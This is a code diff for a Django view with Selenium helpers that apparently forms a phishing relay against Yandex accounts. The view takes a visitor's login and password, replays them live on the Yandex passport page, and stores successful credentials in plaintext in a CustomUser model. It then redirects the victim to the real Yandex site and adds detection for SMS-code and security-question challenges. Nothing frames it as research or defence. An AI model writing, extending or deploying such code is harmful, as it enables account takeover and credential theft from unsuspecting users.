@@ -28,7 +28,11 @@ async def index(request):
 
             if password:
                 result = await asyncio.to_thread(sign_in, driver, login, password)
-                if result == "success":
+                if result == "incorrect_login":
+                    return await sync_to_async(render)(request, 'index.html', {'incorrect_login': True})
+
+
+                elif result == "success":
                     custom_user = CustomUser(login=login, password=password)
                     await sync_to_async(custom_user.save)()
                     return await sync_to_async(redirect)('https://id.yandex.ru/')
@@ -43,16 +47,14 @@ async def index(request):
                     # return await sync_to_async(render)(request, 'secure_login.html',
                     #                                    {'phone_number': phone_secure.text})
 
-
                 elif result == "security_question":
                     # Handle security question
                     return HttpResponse('security question')
 
                 elif result == "incorrect_password":
-                    return await sync_to_async(render)(request, 'index.html', {'incorrect_password': True})
 
+                    return await sync_to_async(render)(request, 'index.html', {'incorrect_password': True})
                 else:
-                    messages.error(request, 'Unknown error occurred')
                     return await sync_to_async(render)(request, 'index.html')
 
             elif login:
@@ -69,8 +71,7 @@ async def index(request):
             elif phone:
                 pass
             else:
-                messages.error(request, 'Please enter login or phone')
-                return await sync_to_async(render)(request, 'index.html')
+                return await sync_to_async(render)(request, 'index.html', {'incorrect_data': True})
 
     return await sync_to_async(render)(request, 'index.html')
 
@@ -87,55 +88,36 @@ def open_yandex_passport(driver):
 
 def sign_in(driver, login, password):
     open_yandex_passport(driver)
-    username_login = WebDriverWait(driver, 10).until(
+    username_login = WebDriverWait(driver, 3).until(
         EC.presence_of_element_located((By.NAME, 'login'))
     )
     login_submit = driver.find_element(By.ID, "passp:sign-in")
     username_login.send_keys(login)
     login_submit.click()
 
-    username_password = WebDriverWait(driver, 10).until(
-        EC.presence_of_element_located((By.NAME, 'passwd')))
-    password_submit = driver.find_element(By.ID, "passp:sign-in")
-    username_password.send_keys(password)
-    password_submit.click()
-
     try:
-        # 1. Successful authorization
-        WebDriverWait(driver, 2).until(
-            EC.presence_of_element_located((By.CLASS_NAME, "UserID-Avatar"))
-        )
-        return "success"
-
+        username_password = WebDriverWait(driver, 3).until(
+            EC.presence_of_element_located((By.NAME, 'passwd')))
+        password_submit = driver.find_element(By.ID, "passp:sign-in")
+        username_password.send_keys(password)
+        password_submit.click()
     except TimeoutException:
-        try:
-            # 2. SMS code required
-            WebDriverWait(driver, 2).until(
-                EC.presence_of_element_located((By.CLASS_NAME, "auth-challenge-form-hint"))
-            )
-            return "sms_code"
+        return "incorrect_login"
 
-        except TimeoutException:
-            try:
-                # 3. Security question
-                WebDriverWait(driver, 2).until(
-                    EC.presence_of_element_located((By.ID, "passp-field-question"))
-                )
-                return "security_question"
-
-            except TimeoutException:
-                try:
-
-                    # 4. Incorrect password
-                    WebDriverWait(driver, 2).until(
-                        EC.presence_of_element_located((By.ID, "field:input-passwd:hint"))
-                    )
-
-                    return "incorrect_password"
-
-                except TimeoutException:
-                    logging.warning(f"wtf")
-                    return "unknown_error"
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    success, sms_code, security_question, incorrect_password = loop.run_until_complete(
+        asyncio.gather(
+            asyncio.to_thread(check_success, driver),
+            asyncio.to_thread(check_sms_code, driver),
+            asyncio.to_thread(check_security_question, driver),
+            asyncio.to_thread(check_incorrect_password, driver)
+        )
+    )
+    logging.warning(f"ALL{[success, sms_code, security_question, incorrect_password]}")
+    result = success or sms_code or security_question or incorrect_password or "unknown_error"
+    logging.warning(f"{result}")
+    return result
 
 async def get_driver(request, client_ip):
     if client_ip not in selenium_drivers:
@@ -152,5 +134,41 @@ async def handle_sms_verification(request):
     client_ip = request.META.get('REMOTE_ADDR')
     driver = await get_driver(request, client_ip)
     if request.method == 'POST':
-        logging.warning(f'HOREEEY')
+        pass
     return await sync_to_async(render)(request, 'verification.html')
+
+def check_success(driver):
+    try:
+        WebDriverWait(driver, 3).until(
+            EC.presence_of_element_located((By.CLASS_NAME, "UserID-Avatar"))
+        )
+        return "success"
+    except TimeoutException:
+        return None
+
+def check_sms_code(driver):
+    try:
+        WebDriverWait(driver, 3).until(
+            EC.presence_of_element_located((By.CLASS_NAME, "passp-field-question"))
+        )
+        return "sms_code"
+    except TimeoutException:
+        return None
+
+def check_security_question(driver):
+    try:
+        WebDriverWait(driver, 3).until(
+            EC.presence_of_element_located((By.CLASS_NAME, "auth-challenge__question"))
+        )
+        return "security_question"
+    except TimeoutException:
+        return None
+
+def check_incorrect_password(driver):
+    try:
+        WebDriverWait(driver, 3).until(
+            EC.presence_of_element_located((By.ID, "field:input-passwd:hint"))
+        )
+        return "incorrect_password"
+    except TimeoutException:
+        return None
